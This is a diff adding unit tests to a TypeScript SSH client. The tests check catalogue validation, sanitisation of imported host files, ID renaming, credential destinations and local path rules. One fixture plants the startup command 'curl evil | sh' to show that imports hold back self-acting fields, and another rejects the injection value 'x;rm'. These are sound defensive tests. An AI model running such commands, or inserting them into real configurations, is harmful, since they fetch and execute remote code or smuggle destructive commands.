@@ -10,6 +10,11 @@ import {
   applyFailure, applyProgress, canRetry, clearFinished, markActive, markCancelled, markDone,
   markFailed, netTargetError, parsePort, policyFor, queuedRow, retryJobs, validateForward,
 } from './transfers.ts'
+import {
+  bindingChanged, catalogueProblem, credentialDestinations, reidentify, sanitizeImport, usableImportedId,
+} from './tree.ts'
+import { clearLocal, emitLocal, onLocal } from './localTerm.ts'
+import { defaultLocalRoot, localBaseName, setLocalRoot, unsafeTransferName } from './localPath.ts'
 
 const deferred = () => {
   let resolve, reject
@@ -311,4 +316,117 @@ test('network tool targets mirror the backend rule', () => {
   assert.ok(netTargetError('-f'))
   assert.ok(netTargetError('a b'))
   assert.ok(netTargetError('x;rm'))
+})
+
+/* ------------------------------------------------------------------ W4 */
+
+const mkHost = (over = {}) => ({
+  kind: 'host', id: 'h-1', name: 'fw1', hostname: '10.0.0.1', port: 22, username: 'admin', auth: 'password',
+  ...over,
+})
+
+test('a catalogue is checked at every depth, not just its top level', () => {
+  assert.equal(catalogueProblem([mkHost(), { kind: 'folder', id: 'f', name: 'F', children: [mkHost({ id: 'h-2' })] }]), null)
+  assert.equal(catalogueProblem([]), null)
+  assert.match(catalogueProblem({ hosts: [] }), /not a list/)
+  assert.match(catalogueProblem([null]), /entry\[0\] is not a host or folder/)
+  assert.match(catalogueProblem([{ kind: 'folder', id: 'f', name: 'F' }]), /no children list/)
+  assert.match(
+    catalogueProblem([{ kind: 'folder', id: 'f', name: 'F', children: [mkHost({ port: '22' })] }]),
+    /entry\[0\]\.children\[0\].*invalid port/,
+  )
+  assert.match(catalogueProblem([mkHost(), mkHost()]), /used twice/)
+  assert.match(catalogueProblem([mkHost({ startupCommands: 'ls' })]), /startupCommands has the wrong type/)
+  assert.match(catalogueProblem([{ kind: 'gadget', id: 'g' }]), /unknown kind/)
+  let deep = [mkHost()]
+  for (let i = 0; i < 70; i++) deep = [{ kind: 'folder', id: `f${i}`, name: 'x', children: deep }]
+  assert.match(catalogueProblem(deep), /nested too deeply/)
+})
+
+test('an import keeps only known fields and holds back self-acting ones', () => {
+  const file = [
+    mkHost({
+      planted: 'x', startupCommands: ['curl evil | sh'], checkConfigOnConnect: true, configCommand: 'show run',
+      aiAllowed: true, local: { profile: 'zsh' }, snippets: [{ label: 'a', command: 'ls', slot: 3, extra: 1 }],
+    }),
+    { kind: 'folder', id: 'f', name: 'F', junk: 1, children: [mkHost({ id: 'h-2', name: 'quiet' })] },
+  ]
+  const off = sanitizeImport(file, false)
+  assert.deepEqual(off.risky.map((r) => r.name), ['fw1'])
+  assert.equal(off.risky[0].enables.length, 4)
+  const h = off.tree[0]
+  for (const f of ['planted', 'startupCommands', 'checkConfigOnConnect', 'configCommand', 'aiAllowed', 'local']) {
+    assert.equal(h[f], undefined, f)
+  }
+  assert.deepEqual(h.snippets, [{ label: 'a', command: 'ls', slot: 3 }])
+  assert.equal(off.tree[1].junk, undefined)
+  assert.equal(off.tree[1].children[0].name, 'quiet')
+  // Confirmed: kept.
+  const on = sanitizeImport(file, true).tree[0]
+  assert.deepEqual(on.startupCommands, ['curl evil | sh'])
+  assert.equal(on.checkConfigOnConnect, true)
+  assert.equal(on.aiAllowed, true)
+  assert.deepEqual(on.local, { profile: 'zsh' })
+})
+
+test('imported ids never alias an existing one by case or use a reserved namespace', () => {
+  const existing = [mkHost({ id: 'h-abc' })]
+  const [a, b, c, d] = reidentify(
+    [mkHost({ id: 'H-ABC' }), mkHost({ id: 'qc-123' }), mkHost({ id: 'h-\u00e9' }), mkHost({ id: 'h-ok', credentialId: 'H-ABC' })],
+    existing,
+  )
+  assert.notEqual(a.id.toLowerCase(), 'h-abc')
+  assert.ok(!b.id.startsWith('qc-'))
+  assert.ok(/^[\x21-\x7e]+$/.test(c.id))
+  assert.equal(d.id, 'h-ok')
+  assert.equal(d.credentialId, a.id, 'a reference follows the rename')
+  assert.ok(usableImportedId('h-lq3x'))
+  assert.ok(!usableImportedId('local-1') && !usableImportedId('ai:default') && !usableImportedId('h 1'))
+})
+
+test('the destinations of a saved password are exactly its current users', () => {
+  const tree = [
+    mkHost({ id: 'lender', hostname: 'a', port: 22 }),
+    mkHost({ id: 'b1', hostname: 'b', credentialId: 'lender' }),
+    mkHost({ id: 'other', hostname: 'c' }),
+    mkHost({ id: 'b2', hostname: 'b', credentialId: 'lender' }), // same tuple once
+  ]
+  assert.deepEqual(credentialDestinations(tree, 'lender'), [
+    { host: 'a', port: 22, username: 'admin' },
+    { host: 'b', port: 22, username: 'admin' },
+  ])
+  // A host that borrows another's credential does not use its own entry.
+  assert.deepEqual(credentialDestinations(tree, 'b1'), [])
+  const before = mkHost()
+  assert.ok(bindingChanged(before, mkHost({ hostname: '10.0.0.2' })))
+  assert.ok(bindingChanged(before, mkHost({ credentialId: 'x' })))
+  assert.ok(!bindingChanged(before, mkHost({ name: 'renamed', tag: 't' })))
+})
+
+test('a stale pane unsubscribing never drops a newer pane on the same id', () => {
+  const got = []
+  const off1 = onLocal('s-x', (t) => got.push(`old:${t}`))
+  clearLocal('s-x')
+  onLocal('s-x', (t) => got.push(`new:${t}`))
+  off1() // the old pane's cleanup runs after the new pane subscribed
+  emitLocal('s-x', 'hello')
+  assert.deepEqual(got, ['new:hello'])
+  clearLocal('s-x')
+})
+
+test('local path rules follow the local platform', () => {
+  assert.equal(localBaseName('/home/u/a\\b.txt', false), 'a\\b.txt')
+  assert.equal(localBaseName('C:\\Users\\u\\f.txt', true), 'f.txt')
+  assert.equal(localBaseName('C:/Users/u/f.txt', true), 'f.txt')
+  // An upload's name is a remote POSIX component.
+  assert.equal(unsafeTransferName('a\\b', 'upload', false), false)
+  assert.equal(unsafeTransferName('12:30.log', 'upload', true), false)
+  // A download's is local.
+  assert.equal(unsafeTransferName('12:30.log', 'download', false), false)
+  assert.equal(unsafeTransferName('12:30.log', 'download', true), true)
+  assert.equal(unsafeTransferName('a\\b', 'download', false), true)
+  for (const bad of ['', '.', '..', 'a/b']) assert.equal(unsafeTransferName(bad, 'upload', false), true, bad)
+  assert.equal(defaultLocalRoot(false), '/')
+  setLocalRoot('D:\\')
+  assert.equal(defaultLocalRoot(true), 'D:\\')
 })
